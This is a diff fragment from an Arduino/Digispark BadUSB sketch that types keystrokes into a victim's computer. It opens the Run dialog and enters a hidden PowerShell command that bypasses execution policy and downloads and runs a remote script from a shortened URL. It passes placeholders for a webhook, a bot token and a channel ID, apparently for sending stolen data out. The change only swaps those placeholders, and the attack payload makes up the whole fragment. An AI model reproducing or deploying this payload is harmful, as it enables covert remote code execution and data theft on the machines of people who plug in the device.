@@ -15,7 +15,7 @@ void loop(){
   DigiKeyboard.sendKeyStroke(21, MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);
   
-  DigiKeyboard.print("powershell -NoP -Ep Bypass -W H -C $hookurl = 'WEBHOOK_HERE'; $ghurl = 'PASTEBIN_URL_HERE'; irm https://is.gd/bwdcc2 | iex");
+  DigiKeyboard.print("powershell -NoP -Ep Bypass -W H -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; $dc = 'WEBHOOK_URL' ; irm https://is.gd/bwdcc2 | iex");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   DigiKeyboard.delay(5000000);
